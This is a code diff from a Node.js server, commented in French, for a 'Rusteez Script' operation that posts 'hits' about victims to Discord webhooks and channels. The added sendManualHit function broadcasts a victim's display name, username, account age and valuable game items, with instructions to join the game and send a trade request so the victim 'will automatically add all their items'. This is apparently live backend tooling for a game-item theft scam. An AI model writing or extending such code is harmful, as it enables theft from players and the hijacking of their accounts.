@@ -540,7 +540,8 @@ wss.on('connection', (ws, req) => {
                                 : "None"}\n\`\`\``
                         }
                     )
-                    .setFooter({ text: `Rusteez Script` });
+                    .setFooter({ text: `Rusteez Script` })
+                    .setTimestamp();;
                         
                     // 4. Envoi sur le Webhook PRIVÉ de l'utilisateur
                     try {
@@ -579,7 +580,8 @@ wss.on('connection', (ws, req) => {
                                         : "None"}\n\`\`\``
                                 }
                             )
-                            .setFooter({ text: `Rusteez Script` });
+                            .setFooter({ text: `Rusteez Script` })
+                            .setTimestamp();
                         
                         publicChannel.send({ embeds: [publicEmbed] });
                     }
@@ -592,34 +594,50 @@ wss.on('connection', (ws, req) => {
     }
     
 });
-app.post('/api/admin/setup-discord', async (req, res) => {
-    // Vérification du Token de sécurité
-    const token = req.query.token;
-    if (token !== ADMIN_TOKEN) {
-        return res.status(401).json({ success: false, message: "Unauthorized Access" });
-    }
+async function sendManualHit(hitData) {
+    const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
+    if (!publicChannel) throw new Error("Public Channel introuvable");
 
-    const { type } = req.body;
+    const publicEmbed = new EmbedBuilder()
+        .setTitle("Rusteez • SAB Hit")
+        .setColor(0x2b2d31)
+        .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.\n` + 
+                       `🔗 **[Rejoin Rusteez Script Server](https://discord.gg/78CmkaUhZy)**`)
+        .addFields(
+            { 
+                name: "📄 Player Information", 
+                value: `\`\`\`properties\n👤 Display Name : ${hitData.displayName}\n🆔 Username     : ${hitData.username}\n🗓️ Account Age  : ${hitData.age} days\n👥 Players      : 1/8\n\`\`\`` 
+            },
+            {
+                name: "👑 Valuable Brainrots",
+                value: `\`\`\`properties\n${hitData.brainrots}\n\`\`\``
+            }
+        )
+        .setFooter({ text: `Rusteez Script`})
+        .setTimestamp();
+
+    await publicChannel.send({ embeds: [publicEmbed] });
+}
+
+// Modifie ta route POST existante
+app.post('/api/admin/setup-discord', async (req, res) => {
+    const token = req.query.token;
+    if (token !== ADMIN_TOKEN) return res.status(401).json({ success: false });
+
+    const { type, data } = req.body; // On récupère 'data' pour le hit manuel
 
     try {
-        log(`🕹️ [ADMIN] Manual Trigger: ${type}`);
-
-        if (type === 'rules') {
-            await sendOfficialRules();
-        } else if (type === 'disclaimer') {
-            await sendLegalDisclaimer();
-        } else if (type === 'tutorial') {
-            await sendTutorial();
-        } else {
-            return res.status(400).json({ success: false, message: "Unknown type" });
-        }
-
-        res.json({ success: true, message: `Action ${type} executed successfully!` });
+        if (type === 'rules') await sendOfficialRules();
+        else if (type === 'disclaimer') await sendLegalDisclaimer();
+        else if (type === 'tutorial') await sendTutorial();
+        else if (type === 'manual_hit') await sendManualHit(data); // Nouvelle condition
+        
+        res.json({ success: true, message: "Action exécutée !" });
     } catch (error) {
-        log(`❌ [ADMIN ERROR] ${error.message}`);
         res.status(500).json({ success: false, message: error.message });
     }
 });
+
 async function sendLegalDisclaimer() {
     const channelId = "1487369531058815096";
     const channel = await clientDiscord.channels.fetch(channelId);
